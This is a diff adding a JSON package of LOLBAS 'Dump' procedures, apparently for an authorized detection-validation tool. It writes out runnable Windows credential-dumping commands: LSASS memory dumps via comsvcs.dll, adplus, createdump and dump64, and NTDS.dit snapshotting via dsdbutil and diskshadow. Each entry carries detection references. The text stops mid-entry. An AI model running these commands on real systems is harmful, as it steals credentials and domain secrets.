@@ -1,0 +1,1400 @@
+{
+  "package_id": "lolbas-dump-v1",
+  "package_name": "LOLBAS - Dump",
+  "version": "1.0.0",
+  "summary": "21 source-derived LOLBAS Project Living-Off-The-Land procedures for Dump.",
+  "description": "Faithful, deterministic conversion of explicit LOLBAS Project procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 21 distinct source procedures grouped by Dump.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Windows binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "LOLBAS Project / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "LOLBAS - ",
+  "provider": "lolbas",
+  "source": "lolbas",
+  "source_repository": "https://github.com/LOLBAS-Project/LOLBAS",
+  "source_commit": "67781fd49a5c8605bba0171dc3d3feec148b432e",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/LOLBAS-Project/LOLBAS",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Dump",
+  "mitre_tcodes": [
+    "T1003",
+    "T1003.001",
+    "T1003.003"
+  ],
+  "platform": [
+    "windows"
+  ],
+  "risk_badges": [
+    "modify",
+    "disrupt"
+  ],
+  "readiness_counts": {
+    "ready": 6,
+    "ready_with_parameters": 15
+  },
+  "category": "lotl/lolbas",
+  "tag_categories": [
+    {
+      "category_id": "lotl_lolbas_parameters",
+      "label": "LOLBAS Project Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_lolbas_argument",
+          "label": "Argument",
+          "description": "Operator-supplied argument for this authorized LOTL procedure. Source token: PID.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "argument"
+        },
+        {
+          "key": "lotl_lolbas_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: PATH_ABSOLUTE:folder.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_lolbas_payload_path",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: PATH:.xml.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Adplus.yml:0:2",
+      "name": "LOLBAS - T1003.001 - adplus.exe - Dump - Run commands under a trusted Microsoft signed binary [440c0da]",
+      "description": "Debugging tool included with Windows Debugging Tools. Dump process memory using adplus config file (see Resources section for a sample file). Use case: Run commands under a trusted Microsoft signed binary. Privilege: SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "adplus.exe -c #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Adplus.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "adplus.exe",
+        "command_index": 2,
+        "category": "Dump",
+        "usecase": "Run commands under a trusted Microsoft signed binary",
+        "privileges": "SYSTEM",
+        "operating_system": "All Windows",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://mrd0x.com/adplus-debugging-tool-lsass-dump/",
+          "https://twitter.com/nas_bench/status/1534916659676422152",
+          "https://twitter.com/nas_bench/status/1534915321856917506"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml"
+          },
+          {
+            "IOC": "As a Windows SDK binary, execution on a system may be suspicious"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Adplus.yml:0:2",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: SYSTEM."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Adplus.yml:0:0",
+      "name": "LOLBAS - T1003.001 - adplus.exe - Dump - Create memory dump and parse it offline [596630a]",
+      "description": "Debugging tool included with Windows Debugging Tools. Creates a memory dump of the lsass process Use case: Create memory dump and parse it offline. Privilege: SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "adplus.exe -hang -pn lsass.exe -o #{lotl_lolbas_local_path} -quiet",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Adplus.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "adplus.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Create memory dump and parse it offline",
+        "privileges": "SYSTEM",
+        "operating_system": "All Windows",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe",
+          "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://mrd0x.com/adplus-debugging-tool-lsass-dump/",
+          "https://twitter.com/nas_bench/status/1534916659676422152",
+          "https://twitter.com/nas_bench/status/1534915321856917506"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml"
+          },
+          {
+            "IOC": "As a Windows SDK binary, execution on a system may be suspicious"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Adplus.yml:0:0",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: SYSTEM."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/comsvcs.yml:0:0",
+      "name": "LOLBAS - T1003.001 - Comsvcs.dll - Dump - Dump Lsass.exe process memory to retrieve credentials. [66f92c1]",
+      "description": "COM+ Services. Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump. Use case: Dump Lsass.exe process memory to retrieve credentials.. Privilege: SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump #{lotl_lolbas_argument} dump.bin full",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/comsvcs.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/comsvcs.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Comsvcs.dll",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Dump Lsass.exe process memory to retrieve credentials.",
+        "privileges": "SYSTEM",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "c:\\windows\\system32\\comsvcs.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/comsvcs.yml:0:0",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: SYSTEM."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Createdump.yml:0:0",
+      "name": "LOLBAS - T1003 - Createdump.exe - Dump - Dump process memory contents using PID. [2d371ad]",
+      "description": "Microsoft .NET Runtime Crash Dump Generator (included in .NET Core). Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process. Use case: Dump process memory contents using PID.. Privilege: SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "createdump.exe -n -f #{lotl_lolbas_local_path} #{lotl_lolbas_argument}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path",
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Createdump.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Createdump.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Createdump.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Dump process memory contents using PID.",
+        "privileges": "SYSTEM",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1003",
+        "full_paths": [
+          "C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe",
+          "C:\\Program Files (x86)\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe",
+          "C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe",
+          "C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/bopin2020/status/1366400799199272960",
+          "https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/aspnetcore/practice-troubleshoot-linux/lab-1-3-capture-core-crash-dumps"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_proc_dump_createdump.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_renamed_createdump.yml"
+          },
+          {
+            "IOC": "createdump.exe process with a command line containing the lsass.exe process id"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Createdump.yml:0:0",
+        "source_tcodes": [
+          "T1003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: SYSTEM."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Diskshadow.yml:0:0",
+      "name": "LOLBAS - T1003.003 - Diskshadow.exe - Dump - Use diskshadow to exfiltrate data from VSS such as NTDS.dit [30f3631]",
+      "description": "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. Execute commands using diskshadow.exe from a prepared diskshadow script. Use case: Use diskshadow to exfiltrate data from VSS such as NTDS.dit. Privilege: User.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "diskshadow.exe /s #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "disrupt",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Diskshadow.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diskshadow.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Diskshadow.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Use diskshadow to exfiltrate data from VSS such as NTDS.dit",
+        "privileges": "User",
+        "operating_system": "Windows server",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\diskshadow.exe",
+          "C:\\Windows\\SysWOW64\\diskshadow.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diskshadow.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          },
+          {
+            "IOC": "Child process from diskshadow.exe"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CMD"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Diskshadow.yml:0:0",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:3",
+      "name": "LOLBAS - T1003.003 - dsdbutil.exe - Dump - Mounting the snapshot identifier 1 and accessing it with `copy c:\\<Snap Volume>\\windows... [e95fac7]",
+      "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. Mounting with snapshot identifier Use case: Mounting the snapshot identifier 1 and accessing it with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "dsdbutil.exe",
+        "command_index": 3,
+        "category": "Dump",
+        "usecase": "Mounting the snapshot identifier 1 and accessing it with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`",
+        "privileges": "Administrator",
+        "operating_system": "Windows Server 2012, Windows Server 2016, Windows Server 2019",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\dsdbutil.exe",
+          "C:\\Windows\\SysWOW64\\dsdbutil.exe"
+        ],
+        "aliases": [
+          {
+            "Alias": "dsDbUtil.exe"
+          }
+        ],
+        "resources": [
+          "https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358",
+          "https://www.netwrix.com/ntds_dit_security_active_directory.html"
+        ],
+        "detection": [
+          {
+            "IOC": "Event ID 4688"
+          },
+          {
+            "IOC": "dsdbutil.exe process creation"
+          },
+          {
+            "IOC": "Event ID 4663"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          },
+          {
+            "IOC": "Event ID 4656"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:3",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:0",
+      "name": "LOLBAS - T1003.003 - dsdbutil.exe - Dump - Snapshoting of Active Directory NTDS.dit database [6f4d0bc]",
+      "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. dsdbutil supports VSS snapshot creation Use case: Snapshoting of Active Directory NTDS.dit database. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "dsdbutil.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Snapshoting of Active Directory NTDS.dit database",
+        "privileges": "Administrator",
+        "operating_system": "Windows Server 2012, Windows Server 2016, Windows Server 2019",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\dsdbutil.exe",
+          "C:\\Windows\\SysWOW64\\dsdbutil.exe"
+        ],
+        "aliases": [
+          {
+            "Alias": "dsDbUtil.exe"
+          }
+        ],
+        "resources": [
+          "https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358",
+          "https://www.netwrix.com/ntds_dit_security_active_directory.html"
+        ],
+        "detection": [
+          {
+            "IOC": "Event ID 4688"
+          },
+          {
+            "IOC": "dsdbutil.exe process creation"
+          },
+          {
+            "IOC": "Event ID 4663"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          },
+          {
+            "IOC": "Event ID 4656"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:0",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:2",
+      "name": "LOLBAS - T1003.003 - dsdbutil.exe - Dump - Deletes the snapshot [c376bfc]",
+      "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. Deletes the mount of the snapshot Use case: Deletes the snapshot. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete #{lotl_lolbas_argument}\" \"quit\" \"quit\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "disrupt",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "dsdbutil.exe",
+        "command_index": 2,
+        "category": "Dump",
+        "usecase": "Deletes the snapshot",
+        "privileges": "Administrator",
+        "operating_system": "Windows Server 2012, Windows Server 2016, Windows Server 2019",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\dsdbutil.exe",
+          "C:\\Windows\\SysWOW64\\dsdbutil.exe"
+        ],
+        "aliases": [
+          {
+            "Alias": "dsDbUtil.exe"
+          }
+        ],
+        "resources": [
+          "https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358",
+          "https://www.netwrix.com/ntds_dit_security_active_directory.html"
+        ],
+        "detection": [
+          {
+            "IOC": "Event ID 4688"
+          },
+          {
+            "IOC": "dsdbutil.exe process creation"
+          },
+          {
+            "IOC": "Event ID 4663"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          },
+          {
+            "IOC": "Event ID 4656"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:2",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:4",
+      "name": "LOLBAS - T1003.003 - dsdbutil.exe - Dump - deletes the snapshot [a02db2e]",
+      "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. Deletes the mount of the snapshot Use case: deletes the snapshot. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "disrupt",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "dsdbutil.exe",
+        "command_index": 4,
+        "category": "Dump",
+        "usecase": "deletes the snapshot",
+        "privileges": "Administrator",
+        "operating_system": "Windows Server 2012, Windows Server 2016, Windows Server 2019",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\dsdbutil.exe",
+          "C:\\Windows\\SysWOW64\\dsdbutil.exe"
+        ],
+        "aliases": [
+          {
+            "Alias": "dsDbUtil.exe"
+          }
+        ],
+        "resources": [
+          "https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358",
+          "https://www.netwrix.com/ntds_dit_security_active_directory.html"
+        ],
+        "detection": [
+          {
+            "IOC": "Event ID 4688"
+          },
+          {
+            "IOC": "dsdbutil.exe process creation"
+          },
+          {
+            "IOC": "Event ID 4663"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          },
+          {
+            "IOC": "Event ID 4656"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:4",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:1",
+      "name": "LOLBAS - T1003.003 - dsdbutil.exe - Dump - Mounting the snapshot to access the ntds.dit with `copy c:\\<Snap Volume>\\windows\\ntds\\n... [5fb6080]",
+      "description": "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. Mounting the snapshot with its GUID Use case: Mounting the snapshot to access the ntds.dit with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount #{lotl_lolbas_argument}\" \"quit\" \"quit\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "dsdbutil.exe",
+        "command_index": 1,
+        "category": "Dump",
+        "usecase": "Mounting the snapshot to access the ntds.dit with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`",
+        "privileges": "Administrator",
+        "operating_system": "Windows Server 2012, Windows Server 2016, Windows Server 2019",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\dsdbutil.exe",
+          "C:\\Windows\\SysWOW64\\dsdbutil.exe"
+        ],
+        "aliases": [
+          {
+            "Alias": "dsDbUtil.exe"
+          }
+        ],
+        "resources": [
+          "https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358",
+          "https://www.netwrix.com/ntds_dit_security_active_directory.html"
+        ],
+        "detection": [
+          {
+            "IOC": "Event ID 4688"
+          },
+          {
+            "IOC": "dsdbutil.exe process creation"
+          },
+          {
+            "IOC": "Event ID 4663"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          },
+          {
+            "IOC": "Event ID 4656"
+          },
+          {
+            "IOC": "Regular and Volume Shadow Copy attempts to read or modify ntds.dit"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dsdbutil.yml:0:1",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dump64.yml:0:0",
+      "name": "LOLBAS - T1003.001 - Dump64.exe - Dump - Create memory dump and parse it offline to retrieve credentials. [0a17588]",
+      "description": "Memory dump tool that comes with Microsoft Visual Studio. Creates a memory dump of the LSASS process. Use case: Create memory dump and parse it offline to retrieve credentials.. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dump64.exe #{lotl_lolbas_argument} out.dmp",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dump64.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dump64.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Dump64.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Create memory dump and parse it offline to retrieve credentials.",
+        "privileges": "Administrator",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Feedback\\dump64.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/mrd0x/status/1460597833917251595"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dump64.yml"
+          },
+          {
+            "IOC": "As a Windows SDK binary, execution on a system may be suspicious"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
